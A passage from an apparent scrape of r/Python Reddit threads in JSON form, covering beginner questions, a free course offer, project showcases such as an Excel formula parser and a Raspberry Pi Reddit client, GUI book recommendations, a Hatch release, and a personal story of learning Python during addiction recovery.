            "content": "Hello Python enthusiasts! I'm excited to join this community and dive deeper into the world of programming! A bit about my journey: I started tinkering with BASIC at the age of 12. Later running multiple BBSs on an Amiga. My adventure continued as I explored HTML, JAVA, PHP, and CSS. Lately, I've been fascinated by AI and ChatGPT. However, I realize that using builders alone won't suffice for integrating advanced features into my websites securely. My aim is to create tools that assist individuals with disabilities, an endeavor close to my heart. To achieve this, I need to master the environment in which these tools operate. Although I've experimented with creating a series of agents to practice on, I'm still figuring out how to effectively deploy them on websites. I've always learned differently—school tests were never my thing, so I carved my own path as an entrepreneur, learning from deconstructing top-rated sites and engaging with knowledgeable peers who were generous with their insights. As I continue my learning journey in this community, could you help me understand where I should focus my efforts? What specific technologies or frameworks should I prioritize to better control and integrate AI functionalities into my web projects? Any advice or resources you could share would be incredibly appreciated!",
            "replies": [
                {
                    "author": "niehle",
                    "score": "1",
                    "content": "You want to \"add AI\" to do what exactly?"
                }
            ]
        }
    ]
},
{
    "post_author": "AlSweigart",
    "post_id": "1chqnff",
    "post_score": "12",
    "post_time": "Wednesday, May 1, 2024 at 7:37:34 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "2,000 free sign ups available for the \"Automate the Boring Stuff with Python\" online course. (May 20",
    "media": [
        "https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW",
        "https://inventwithpython.com/",
        "https://udemy.com/course/automate/?couponCode=MAY2024FREE",
        "https://automatetheboringstuff.com/2e/",
        "https://udemy.com/course/automate/?couponCode=MAY2024FREE2",
        "https://www.youtube.com/watch?v=kSrnLbioN6w&list=PL0-84-yl1fUmeV_2bBSguF_S0TVZk8wow&index=1",
        "https://www.reddit.com/r/ProgrammingBuddies/",
        "https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F"
    ],
    "post_content": "If you want to learn to code, I've released 2,000 free sign ups for my course following my Automate the Boring Stuff with Python book (each has 1,000 sign ups, use the other one if one is sold out):\n*The sign ups are all used up, but you can still watch all the videos for free. Read below!\nhttps://udemy.com/course/automate/?couponCode=MAY2024FREE\nhttps://udemy.com/course/automate/?couponCode=MAY2024FREE2\nIf you are reading this after the sign ups are used up, you can always find the first 15 of the course's 50 videos are free on YouTube if you want to preview them. YOU CAN ALSO WATCH THE VIDEOS WITHOUT SIGNING UP FOR THE COURSE. All of the videos on the course webpage have \"preview\" turned on. Scroll down to find and click \"Expand All Sections\" and then click the preview link. You won't have access to the forums and other materials, but you can watch the videos.\nNOTE: Be sure to BUY the course for $0, and not sign up for Udemy's subscription plan. The subscription plan is free for the first seven days and then they charge you. It's selected by default. If you are on a laptop and can't click the BUY checkbox, try shrinking the browser window. Some have reported it works in mobile view.\nI'm also working on another Udemy course that follows my recent book \"Beyond the Basic Stuff with Python\". So far I have the first 15 of the planned 56 videos done. You can watch them for free on YouTube.\nFrequently Asked Questions: (read this before posting questions)\nThis course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.\nIf you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.\nThis Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com\nThe 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/\nI do plan on updating the Udemy course, but it'll take a while because I have other book projects I'm working on. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.\nIt's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.\nYou're not too old to learn to code. You don't need to be \"good at math\" to be good at coding.\nSigning up is the first step. Actually finishing the course is the next. :) There are several ways to get/stay motivated. I suggest getting a \"gym buddy\" to learn with. Check out r/ProgrammingBuddies",
    "comments": [
        {
            "author": "Barury797",
            "score": "1",
            "content": "Just got it! Hope to complete the course soon!"
        },
        {
            "author": "0uterspacepony",
            "score": "1",
            "content": "So sad I keep missing this! I'm suspicious of a glitch, I tried using a different browser too but it says it is expired? Anyone else having trouble? I will read in the meantime but would be awesome to do the udemy! <3"
        }
    ]
},
{
    "post_author": "baranonen",
    "post_id": "haq3vc",
    "post_score": "2093",
    "post_time": "Wednesday, June 17, 2020 at 3:24:03 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Made a small Reddit client that runs on a 0.96 inch OLED display with a Raspberry Pi as my first project written in Python",
    "media": [
        "https://external-preview.redd.it/upiScAxZfDs_La3NxGfnnxCrbcWp57TBhHn4K8ogkE0.png?width=640&crop=smart&format=pjpg&auto=webp&s=9fcc60a18e3c6a33a2dcc563918bf2b9c26d0f65"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "PraveenKumar011",
            "score": "64",
            "content": "Awesome work man, Btw a noob question, can this be made with Arduino?",
            "replies": [
                {
                    "author": "baranonen",
                    "score": "44",
                    "content": "I think it can be made, but a WiFi module such as an ESP8266 is needed",
                    "replies": [
                        {
                            "author": "galleyest",
                            "score": "15",
                            "content": "Arduino Nano 33 IOT comes with a wifi chip in addition."
                        }
                    ]
                },
                {
                    "author": "hermthewerm00",
                    "score": "6",
                    "content": "You might run into memory restrictions with the regular Uno."
                }
            ]
        },
        {
            "author": "baranonen",
            "score": "45",
            "content": "If anybody wants, here's the GitHub link: https://github.com/baranonen/oleddit"
        },
        {
            "author": "[deleted]",
            "score": "15",
            "content": "How much do these small OLEDs cost?"
        },
        {
            "author": "buknbend",
            "score": "12",
            "content": "My first project was print(\"Hello world\") I can't really figure out anything thats more complex. How did you learn to code?"
        },
        {
            "author": "ashishkhulbey",
            "score": "3",
            "content": "Awesome work and thanks for sharing!"
        },
        {
            "author": "GrandBadass",
            "score": "3",
            "content": "Nice Project. One quick question from me - Could you have other errors besides HTTPError 429?"
        },
        {
            "author": "dougie-io",
            "score": "3",
            "content": "Still better than the reddit redesign."
        },
        {
            "author": "misingnoglic",
            "score": "2",
            "content": "Very cool!"
        },
        {
            "author": "igoldin74",
            "score": "2",
            "content": "This is dope!"
        }
    ]
},
{
    "post_author": "MPGaming9000",
    "post_id": "1cipq2f",
    "post_score": "58",
    "post_time": "Thursday, May 2, 2024 at 11:19:35 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a python package that can parse Excel Formula Strings into dictionary structures! ",
    "media": [
        "https://github.com/Voltaic314/ExcelFormulaParser"
    ],
    "post_content": "What my project does:\nIt basically takes a formula string like you'd get from Openpyxl like \"=SUM(A1:B2)\" and breaks it all out into a dictionary structure for you to then navigate through, modify, and then reformat that modified structure back into an excel friendly formula string again!\nTarget Audience: (People who modify Excel formula strings in automated spreadsheet modification scripts. Or people who need to analyze formulas in a spreadsheet to do some kind of logic based on that analysis).\nDisclaimer: For most people some simple regex pattern matching and str replaces would be fine to modify formulas but if you need a more structured approach to working with these strings, this package has you covered!\nHow does it differ compared to other projects: There are libraries like Openpyxl that allow you to tokenize and translate formulas but that's currently where it ends. It doesn't allow you to systematically parse out a formula and replace those pieces and add new structures and what not into it. Currently the best you can really do is translate formulas and anything other than that would need to rely on regex string matching logic or string replacements. (Which still would be fine for most people, but this just adds another layer of organization and scalability to the format).\nMore info about it here: https://github.com/Voltaic314/ExcelFormulaParser\nTo install, just do: pip install ExcelFormulaParser\nThank you for reading this!! Hope you guys find it useful if you're ever systematically modifying (or analyzing) spreadsheets!",
    "comments": [
        {
            "author": "TheBB",
            "score": "20",
            "content": "By the way, this type of data structure is called an abstract syntax tree (AST).",
            "replies": [
                {
                    "author": "MPGaming9000",
                    "score": "8",
                    "content": "Thank you for letting me know! I will research it a bit more and update the wording on the library for it. :)"
                }
            ]
        },
        {
            "author": "sanbales",
            "score": "5",
            "content": "Thanks for sharing, but how would you differentiate your package from what formulas does?",
            "replies": [
                {
                    "author": "MPGaming9000",
                    "score": "14",
                    "content": "I didn't know about this library, thanks for sharing! It looks like the way it breaks up formulas into a different kind of json structure than mine. I have yet to actually use it but looking at the dictionary structure in the documentation it looks like it doesn't break up smaller bits into a hierarchy structure the way mine does but maybe it's not that way when you actually print or save the dictionary structure as a json file. It also looks like it has extended functionality but my library is meant to just focus specifically on the lightweight aspect of breaking out formulas into a dictionary and then reconstructing them with any modifications back into an excel friendly formula string. The whole reason I even made this library was to help me at my job so if someone has a better library that accomplishes these tasks then I'll gladly use that instead of reinventing the wheel. But if my library can help others then great!"
                }
            ]
        },
        {
            "author": "Macrophages_mphi",
            "score": "2",
            "content": "This project looks interesting to me! But may you specify more on what specific task at your job would need the functions you mentioned? Just would like to have an example to demonstrate the use cases. PS: I’m currently a student so I’m not very familiar with the workplace scenarios yet.",
            "replies": [
                {
                    "author": "MPGaming9000",
                    "score": "3",
                    "content": "Thank you! A lot of my work involving spreadsheets has me writing code to take the values and formatting of cells from one spreadsheet to another. When you read a formula in Openpyxl (library for interacting with spreadsheets), it just displays the formula and not the calculated value. The formula is just a string, and it can include many different components, cell ranges, cell references, functions with arguments that are functions and so on. It can get pretty messy. The problem is, when I have to remap a formula to point it's references to a new row / column, I need a way to tell python to find those references and modify their values. Sometimes I may need to quickly modify a bunch of formulas by changing one of their arguments to something else. Most of this logic can be done with regex string matching and built in string methods in Python but the point of the library is to not have to do that and instead be able to modify parts of it more precisely (like for example doing str.replace() will replace all instances of that (or you can provide a count argument but then it only replaces each one from left to right but it just can be a pain to try to do this in a precise consistent way of modifying these formulas every time. When transforming spreadsheets or taking data from one spreadsheet to another, accuracy is the most important thing. You need to know that your formulas are being modified in an extremely consistent and predictable way every time. By transforming the formulas into a dictionary structure you can know exactly which key and value you're modifying instead of the chaotic nature of strings and string replacements. So it's mainly for better precision and control. :)"
                }
            ]
        },
        {
            "author": "Coding_Jedi_SoCal",
            "score": "2",
            "content": "Nice!"
        },
        {
            "author": "Western-Pause-2777",
            "score": "2",
            "content": "My days. You are legendary. Thank you!"
        }
    ]
},
{
    "post_author": "Bekhyam",
    "post_id": "1chdeym",
    "post_score": "69",
    "post_time": "Wednesday, May 1, 2024 at 7:36:21 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Best book for GUI development in Python",
    "media": [],
    "post_content": "Can you guys suggest some very good book for GUI development in Python?\nI'm currently working on a visualizer that needs many features to plot data on a 3D and 2D space. Using PyQt for this as it has threading support.",
    "comments": [
        {
            "author": "Amazing_Upstairs",
            "score": "36",
            "content": "Create GUI Applications with Python Qt6 PySide6",
            "replies": [
                {
                    "author": "TheMasterYankee",
                    "score": "7",
                    "content": "Currently learning PySide6 myself. There's so much information it can be overwhelming. Best to take little bits at a time and hammer each thing into your memory via repetition before moving to more classes or methods. I'm thoroughly enjoying the process, though!"
                }
            ]
        },
        {
            "author": "gultregnikina",
            "score": "33",
            "content": "https://www.pythonguis.com/books/",
            "replies": [
                {
                    "author": "Bekhyam",
                    "score": "-33",
                    "content": "",
                    "replies": [
                        {
                            "author": "mfitzp",
                            "score": "69",
                            "content": "I’m the author of these books & they’re available to buy in paperback on Amazon if you want. If you buy the paperback you can send me your receipt to get the digital edition (& future updates) for free. I’ll be releasing an update in the next week or so (there have been some changes in Qt)"
                        },
                        {
                            "author": "Cybasura",
                            "score": "25",
                            "content": "Please, read what you just said, again and again Do it a couple more times until you understand it, because I hope you know what the mistake is without us telling you"
                        },
                        {
                            "author": "VAL9THOU",
                            "score": "11",
                            "content": "You know you can just print it out, right?"
                        },
                        {
                            "author": "luckyspic",
                            "score": "1",
                            "content": "get a load of this guy"
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "8",
            "content": "Depends what the project’s goal is. If the goal is more or less a dashboard, then streamlit is an excellent choice. But if more customization and control is required, some proper app framework will be needed.",
            "replies": [
                {
                    "author": "marsupiq",
                    "score": "10",
                    "content": "Depends what the project’s goal is. If the goal is more or less a dashboard, then streamlit is an excellent choice. But if more customization and control is required, some proper app framework will be needed."
                },
                {
                    "author": "Bekhyam",
                    "score": "4",
                    "content": "Appreciate that, But what I need is a step by step guide i.e. how an application works, how we can use signalling in a multi threaded application and all that kinda stuff I searched for PyQt tutorials over YT, but didn't find a proper tutorial that suits my needs"
                },
                {
                    "author": "MH1400x",
                    "score": "3",
                    "content": "I'm using Streamlit to link all of our company databases into one location for data exploration. It's stupid-simple, tons of tutorials and docs. If you're good, you can easily go beyond its base limits. 10/10, would recommend for what your needs are. And... anything you dont know is a quick web search away."
                },
                {
                    "author": "[deleted]",
                    "score": "1",
                    "content": "Streamlit is remotely an alternative to something like QT."
                }
            ]
        },
        {
            "author": "Ok_Feedback_8124",
            "score": "2",
            "content": "https://pythonbooks.org/topical-books/graphical-user-interface/ Seems legit."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cmqqgn",
    "post_score": "2",
    "post_time": "Wednesday, May 8, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "UnemployedTechie2021",
            "score": "3",
            "content": "I want to relearn Python because I have been searching for an opportunity for a while now but am not getting any. This has jolted the pillars of my confidence because I am not a beginner. I have around 20 years of work experience, I have worked with a Big 4 for 10 years some of which were as a Manager of a DataViz team. I have been learning coding since the time of MS Dos and have been a Teaching Assistant for a Deep Learning course. I understand that r/Python won't be able to help me gain my confidence, that's not the purpose of this sub. However, I personally feel that if I relearn Python I would be able to gain back some of the lost confidence. So I am asking for your feedback and help. - If I were to relearn Python, will CS50 be a good idea? - Is this the correct URL for CS50? https://cs50.harvard.edu/x/2024/ - I see that CS50 has other topics like C, SQL etc other than Python. However, I do not see pointers which is making me rethink about CS50. Will CS50 cover majority of the important topics for Python, or will it omit important topics like pointers for C in Python too? - Can somebody suggest a note taking method why I can apply to keep notes from this course which will not only help me in future but others too since I plan to make my progress etc open-source. Any help would be highly appreciated. Thanks in advance.",
            "replies": [
                {
                    "author": "niehle",
                    "score": "2",
                    "content": "Why not https://cs50.harvard.edu/python/2022/ ? You can also use https://programming-24.mooc.fi/ - whatever course fits you best. You should choose a note taking app which works for you since it is far from guaranteed other people are interested in your notes, even if they are open source."
                }
            ]
        },
        {
            "author": "rittler67",
            "score": "1",
            "content": "Hello Python enthusiasts! I'm excited to join this community and dive deeper into the world of programming! A bit about my journey: I started tinkering with BASIC at the age of 12. Later running multiple BBSs on an Amiga. My adventure continued as I explored HTML, JAVA, PHP, and CSS. Lately, I've been fascinated by AI and ChatGPT. However, I realize that using builders alone won't suffice for integrating advanced features into my websites securely. My aim is to create tools that assist individuals with disabilities, an endeavor close to my heart. To achieve this, I need to master the environment in which these tools operate. Although I've experimented with creating a series of agents to practice on, I'm still figuring out how to effectively deploy them on websites. I've always learned differently—school tests were never my thing, so I carved my own path as an entrepreneur, learning from deconstructing top-rated sites and engaging with knowledgeable peers who were generous with their insights. As I continue my learning journey in this community, could you help me understand where I should focus my efforts? What specific technologies or frameworks should I prioritize to better control and integrate AI functionalities into my web projects? Any advice or resources you could share would be incredibly appreciated!",
            "replies": [
                {
                    "author": "niehle",
                    "score": "1",
                    "content": "You want to \"add AI\" to do what exactly?"
                }
            ]
        }
    ]
},
{
    "post_author": "GaiusOctavian112",
    "post_id": "jus4vq",
    "post_score": "2089",
    "post_time": "Sunday, November 15, 2020 at 10:50:59 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "From Depressed Addict to Happy 25 Year old Making 65k/year - How learning Python helped save my life",
    "media": [
        "https://www.reddit.com/r/learnpython/",
        "https://udemy.com/",
        "https://www.reddit.com/r/addiciton/",
        "https://www.reddit.com/r/addiction/",
        "https://stackoverflow.com/",
        "https://www.reddit.com/r/depression_help/"
    ],
    "post_content": "Hello all,\nI am new to reddit, and after reading some posts of people expressing their frustration learning Python, I thought I would write about my own story on how learning Python helped save my life, and perhaps more importantly, gave my life meaning. I will try to be as brief as I can in my back story to keep this as relevant to Python as possible, but I feel it would be a disservice to leave it out completely, as my issues with mental health were a primary driver of the motivation I took advantage of to learn Python. I will post a more detailed description of my backstory later in r/addiciton or r/depression_help or something similar. Feel free to skip to the second *** to go straight to when I started learning python, however I suggest you read the whole post because honestly my whole story is relevant. If I hadn't gone through what I went through, I doubt I would have had the motivation to self-teach myself Python.\n***\nI grew up in a wealthy, extremely homogenous town within an hour of New York City. I went to a public school, but if you saw the way people dressed, it looked more like a private prep school. The vast majority of the kids in my school had parents who were millionaires. My parents were not. I was an only child, and I grew up in a small apartment on the \"poor\" side of town (\"poor\" meaning houses/ apartments went for < 750k). As you can imagine, the social structure of the school was entirely based off the wealth of your parents. So the game was rigged against me from the beginning. I had very few friends at a young age, and most people in my middle school probably would have described me as a \"loser\" or another synonymous term. I was very unhappy and became addicted to video games as a mean to escape my life. During high school, I finally started branching out to meet people from the surrounding towns, who were not nearly as pretentious as the people I grew up with. I made a lot of friends and started to have a legitimate social life. However, with this new social life came a lot of superficiality and drinking/drug using.\nUntil my senior year of high school, my grades were mediocre at best. Because I hated my social life at school, I hated school in general. But in my senior year, something changed. I won't detail it in this post, but will certainly get into it more in my next post in r/addiction or r/depression_help . I improved my grades and went to community college for my first year. I ended that year with a 3.9 GPA and an acceptance to one of the best colleges in my state. I transferred to that college and thought my life from there on out would be perfect. I was wrong.\nI hated the social scene of my college. I found it to be very superficial and revolved almost entirely around drinking. Later I realized that while this was true for the people I was surrounding myself with, nobody forced me to surround myself with those people. I did it because I thought that this was the only way to enjoy college, and if I didn't, I would be missing out on the experience of my life. Man, what a load of BS I let myself believe. This expectation set me up for failure, and I blamed myself entirely. I thought I was worthless, a loser, and that all the mean things people said about me in my hometown back in middle school were true. I fell into a deep depression and eventually dropped out.\nTowards the end of my time away at this state school, I saw a psychiatrist who prescribed me Adderall and Xanax to treat my depression and learning disabilities. In the beginning, they worked wonders, but they certainly didn't solve the underlying issues, they actually made them worse. After I dropped out, I began to rely on them completely. Before long, I was blacking out all the time as a result of the Xanax, and up for days at a time as a result of the Adderall. It was always one or the other, and I had to use the other to counter the negative effects of one.\nFor the next few years, I battled with addiction and depression to the point where I felt hopeless. I would get a week or two or three sober, then relapse. Somehow I managed to go back to a local college during this time, but my grades were mediocre, because I would miss a week of school every time I would relapse. Eventually I went away to rehab for four months. This is where I started to learn Python. I was very fortunate to have parents who loved me enough to spend the money to send me to a place for four months. I know not everyone has this privilege, and it is my goal to pay my parents back the money they spent on me.\n***\nThe rehab I went to was basically in the middle of nowhere, and while I was inpatient the first month, the last three months I was in what was essentially a nicer version of a sober house. I worked part- time at a restaurant (~20 hours a week). I had computer access, and I found myself very bored during the first week or two, so I decided to learn something I had always wanted to learn: Programming. I bought a few courses off udemy.com for ~$12/each (NEVER pay full price of a Udemy course. You can always get them discounted), and started learning. Pretty much anytime I wasn't working or going to AA meetings, I was programming. I essentially replaced my addiction to drugs with an addiction to learning. I really enjoyed it, but in hindsight, I overdid it, as any addict does. I came home after four months, and I fell back into old patterns, and relapsed just before I would have been 6 months sober. I will go into more detail about this in my posts in r/addiction / r/depression_help .\nDuring my time in rehab, I completed 3 Udemy courses on Python, but honestly I only really learned the fundamentals. I've never been a very quick learner, as I have a processing disorder (I was always the last one to finish tests in school and it always took me longer to do assignments etc). I frequently got frustrated, and rarely took breaks. I would spend 4-8 hours a day practicing coding, but much of that time was obsessing over one thing that I couldn't figure out. This was a big part of why I burnt myself out. Later, I found that if I ran into a problem I couldn't figure out, and forced myself to take a break, 95% of the time I would figure it out within 10 minutes of coming back from a 15-20 minute break. The mind is funny like that.\nFast forward about 6 months and I was back in rehab, this time for only 30 days. I came home and luckily got an internship at a very small investment firm, where they used python to trade stocks algorithmically. There, I had a boss who was a very good programmer, and he gave me real projects to do that required me to think critically. He rarely gave me any help. Most of the time when I asked a question he would say \"I know the answer, but you have to figure it out. It's the only way you'll learn\". This frustrated me at the time, but looking back it was probably one of the best things anyone ever did for me. I developed resourcefulness and patience, two incredibly imperative skills for any programmer who wants to be worth his/her salt. During this time, I was taking a few classes at a local college to finally finish my degree, and I was working anywhere from 15-40 hours a week at this investment firm, unpaid. I honestly worked a bit too hard, I almost burnt myself out again, but I managed to get through it. I was very lucky in that my parents helped me financially during this time, which allowed me to focus more on school and work. I had a few relapses during this period, but they were short and mild, so it didn't throw me off track too badly.\nOver this past summer I finished up my degree (I majored in Business) and started looking for jobs. I was sure to put as much of my accomplishments at the small investment firm that involved python on my resume as I could. Covid was (and is) still wreaking havoc on the economy, so I worked extra hard applying to jobs, making connections, and keeping my skills sharp. I honestly probably applied to over 2500 jobs. I only got maybe 3-4 interviews. I had one during the end of the summer that went to the final round, and I was sure I was going to get the job. I didn't. Instead, the company (according to a connection I had made within the company cold-emailing people) decided to hire people from India to save money. I definitely felt pretty hopeless at that point. But I didn't give up. Maybe a month later, I got an interview for a job at a major company as a Data Analyst. I had three rounds of interviews plus I had to send them examples of some of my Python projects. I didn't get my hopes up like I did last time, out of fear of being disappointed. To my surprise, I got the job. I had asked for a 50k salary. They gave me 60k base plus a 5k bonus contingent on my performance, plus great benefits.\nI've been at this job for a little over a month, and I honestly love it. I find myself excited to go to work every day, and the people really like me because I am able to provide real value to the company. In my first month, I worked a lot on automation of otherwise very manual tasks (usually involving excel or emails). I would ask people how many hours per week they would generally spend on such a task and wrote it down. I recently did the math and realized that I have so far saved the company over 750 hours of work per year, and that’s a conservative estimate using a 48 week year (to account for holidays, vacation etc.) and the low end of their estimated range of hours per week. This frees the employees up to work on more value added (and frankly much more interesting) projects. My work there is just beginning, and there are a ton of projects I am really excited about.\n### (Please go to the next ### if you have no interest in hearing anything non-Python related)\nI can honestly say I am happy now. I have over 4 months sober, and I rarely have any cravings to use drugs anymore. I really think this is largely because I found purpose in my life. That said, I still attend AA meetings often because I know I have to keep my sobriety my first priority. Without it, I have nothing. I also know that life isn't going to be perfect every day. While I do consider myself happy today, I still have bad days. Such is life. I stopped expecting to feel good all the time. Life is not designed that way. Before, I was only \"happy\" if I had a substance in my system. Also, \"happy\" to me was a euphoric rush which felt good, but was never fulfilling. Now I define happiness differently. It doesn't mean I feel good all the time. It means that despite sometimes not feeling good, I can appreciate how lucky I am to be alive and how blessed I am to have been given a second chance. Getting out of the rut that I found myself in a few years ago was the hardest thing I have ever done, but it was 100% worth it. At the risk of sounding corny, I really do believe sometimes you have to fall down hard and struggle getting back up to appreciate your life.\n###\nLearning Python was part of my journey, and it wasn't easy at all. When I started, I had a lot of doubts that I could do it. I didn't think \"people like me\" would be successful at something like this. Again, I was wrong. While I am certainly not even close to an expert at Programming/Python, I am good enough to be hired at a large company and good enough to make a difference. I'm sure there are people on Reddit and elsewhere that could make me look like I started programming last week. But I try not to compare myself to others. I instead try to compare myself to who I was before, and who I want to be in the future. As I’ve said several times before, I will make another post with more details about my experience with addiction/depression and give my general tips for life there, but for now here are my general tips for learning Python:\nI suggest starting with the fundamentals. I used Jose Portilla's Udemy course for this and it was great. I will link it at the bottom along with some other resources.\nIf you struggle motivating yourself to follow online courses, try figuring out a real project to do that can actually help you in everyday life. This could be automating something you do in your job, for school, or just something you think will be fun.\nWork Hard. Don't give up. But don't burn yourself out. Take frequent breaks, especially when you get frustrated.\nAsk for help. If you’re struggling with a specific problem, r/learnpython is great, along with Stackoverflow.com . People have helped me with many problems there.\nTrust the Process. Programming is a lot like learning an instrument in my opinion. At first it can be grueling and you won’t be able to do much for a while, but after you learn the fundamentals, it becomes incredibly enjoyable.\nBe consistent. This is extremely important. Try to set aside a time every day to practice. Even if it’s only 20-30 minutes.\nThere are many more tips that I have but those are the most important ones I can think of. Please feel free to follow me as I hope to be quite active on reddit in the future. If you have any questions, please message me. Whether it's about Python, Addiction, Depression, or whatever else. I'll do my best to answer everyone I can.\nThanks.",
    "comments": [
        {
            "author": "TouchingTheVodka",
            "score": "128",
            "content": "This is a really inspiring story - Thanks for sharing!"
        },
        {
            "author": "[deleted]",
            "score": "48",
            "content": "Congrats! I have a similar background to you and am currently taking a six-month sabbatical from the job I was able to get outside of college to study for more meaningful work. This post made me feel motivated today.",
            "replies": [
                {
                    "author": "GaiusOctavian112",
                    "score": "22",
                    "content": "Thank you! Taking calculated risks to find more meaningful work is always the right move in my opinion. I wish you the best of luck, Don't give up!"
                }
            ]
        },
        {
            "author": "zolaaa24",
            "score": "19",
            "content": "You re real hero! Good job mate. Never Give up. Life is miracle with dark and light sides. We all struggle. I am into Python journey! Wish all the luck in the future!"
        },
        {
            "author": "rybthrow",
            "score": "24",
            "content": "Thank you for being so frank and honest, really great read and inspiring!"
        }
    ]
},
{
    "post_author": "Ofekmeister",
    "post_id": "1cigfix",
    "post_score": "42",
    "post_time": "Thursday, May 2, 2024 at 5:00:46 PM GMT+3",
    "flair_text": "News",
    "post_title": "Hatch v1.10.0 - UV support, new test command and built-in script runner",
    "media": [
        "https://hatch.pypa.io/latest/blog/2024/05/02/hatch-v1100/",
        "https://github.com/pypa/hatch"
    ],
    "post_content": "Hello everyone! I'd like to announce version 1.10.0: https://hatch.pypa.io/latest/blog/2024/05/02/hatch-v1100/\nFeel free to provide any feedback either here or as a discussion on the repo: https://github.com/pypa/hatch",
    "comments": [
        {
            "author": "OkRecover5170",
            "score": "10",
            "content": "\"\"\" Hatch is a modern, extensible Python project manager. Features Standardized build system with reproducible builds by default Robust environment management with support for custom scripts and UV Configurable Python distribution management Test execution with known best practices Static analysis with sane defaults Built-in Python script runner Easy publishing to PyPI or other indices Version management Best practice project generation Responsive CLI, ~2-3x faster than equivalent tools \"\"\""
        },
        {
            "author": "the-pythonista",
            "score": "5",
            "content": "I’ve used Hatch before but looks like it’s now updated to use modern tooling like ruff and uv. I’ll give it another go."
        },
        {
            "author": "doolio_",
            "score": "4",
            "content": "Awesome."
        },
        {
            "author": "Sockslitter73",
            "score": "3",
            "content": "How does hatch deal with locking dependencies? This is the primary reason I am using poetry (despite other gripes I have with it). Hatch looks better on most other fronts, but that is a big one for me...",
            "replies": [
                {
                    "author": "Ofekmeister",
                    "score": "5",
                    "content": "This is the plugin that everyone uses for that https://github.com/juftin/hatch-pip-compile",
                    "replies": [
                        {
                            "author": "Sockslitter73",
                            "score": "3",
                            "content": "Cheers, I will give hatch a spin tomorrow and see how I like it ;)"
                        },
                        {
                            "author": "Sockslitter73",
                            "score": "-1",
                            "content": "Cheers, I will give hatch a spin tomorrow and see how I like it ;)"
                        },
                        {
                            "author": "Sockslitter73",
                            "score": "-1",
                            "content": "Cheers, I will give hatch a spin tomorrow and see how I like it ;)"
                        },
                        {
                            "author": "Sockslitter73",
                            "score": "-1",
                            "content": "Cheers, I will give hatch a spin tomorrow and see how I like it ;)"
                        }
                    ]
                }
            ]
        },
        {
            "author": "pyhannes",
            "score": "2",
            "content": "Hatch is awesome and simplified our workflow a lot. We were waiting for the 1.10 release with UV support already, it speeds up our pipelines by at least 25%! Now we just need better support for enterprise CI environments without Internet access (but internal mirrors for most stuff) ;) See https://github.com/pypa/hatch/pull/1455 for example ;)"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cke7cp",
    "post_score": "9",
    "post_time": "Sunday, May 5, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "vectorizer99",
            "score": "13",
            "content": "Not sure if it counts, and I'm a newbie to this subreddit, but ... starting to slowly read the Fluent Python book and work though the examples. I'm just an amateur coding in Python to build smallish (3-20kloc) programs to support my main hobby, and I'm tired of the feeling that I could be much more effective if I learned the language systematically instead of one Google search at a time."
        },
        {
            "author": "cmcclu5",
            "score": "9",
            "content": "Working on kicking out tutorials for the coding challenges I have gotten as a principal/senior engineer so that others can benefit from my terrible interview experiences."
        },
        {
            "author": "Gokdencircle",
            "score": "6",
            "content": "Working on a evolution sim, where each creature is an independent small neural network, sized 3/16/4. Mutation by random modding selected weights. Displaying the movements in a 3d world. Creatures are low poly 3d models. Thusly also working on a 3d projection engine. Predictable, at more than 80 creatures my modest desktop grinds to about 1 fps So sone optimisation to do (numba?) Anyway its just my hobby, huge fun."
        },
        {
            "author": "__shrubbery__",
            "score": "5",
            "content": "I just released qtile-bonsai yesterday! It's sort of an extension for the python-scriptable qtile tiling window manager , that lets you arrange your windows as splits, tabs and even sub-tabs.",
            "replies": [
                {
                    "author": "CopOnTheRun",
                    "score": "2",
                    "content": "Question, as someone else who's making a Linux based tool, how do you best distribute your package? I see you have listed pip install, but most modern versions of pip aren't letting users install a package without being in a virtual environment (for good reason). Then you have to explain what a virtual environment is and how to set it up. Oftentimes (for venv at least) then you have to make sure you've got the environment active and that all seems like a mess from a user perspective. I feel like the best way would be to get it into each ditro's repository but I'm barely familiar with packaging for Python and pip, let alone every Linux distro in existence.",
                    "replies": [
                        {
                            "author": "__shrubbery__",
                            "score": "2",
                            "content": "For a tool (like a CLI/GUI application), I reckon the fairly standard way of doing it nowadays is to install it via pipx, which automatically installs things into venvs behind the scenes. But it's made available in your shell and desktop-env just like any other application. eg. I have tools like httpie, ipython, etc installed this way. As a developer, you just have to make your package available in the usual way in PyPI. For my library here, it's a little tricky since it's not a tool, rather a library. And it's kind of an extension to a tool - qtile. (btw, I'd install qtile via `pipx` if it wasn't available in my linux package manager). Right now, I actually have to do pip install qtile-bonsai --break-system-packages so that the system level qtile package can see my library package (I should add this to the README). I have a TODO to publish it on other channels where qtile is available. I think `pipx` should have a way to have 2 packages share the same venv so they can see each other, but I haven't looked into it. Edit: Just saw that pipx has a pipx inject feature that allows the above :)"
                        }
                    ]
                }
            ]
        },
        {
            "author": "hawkedmd",
            "score": "3",
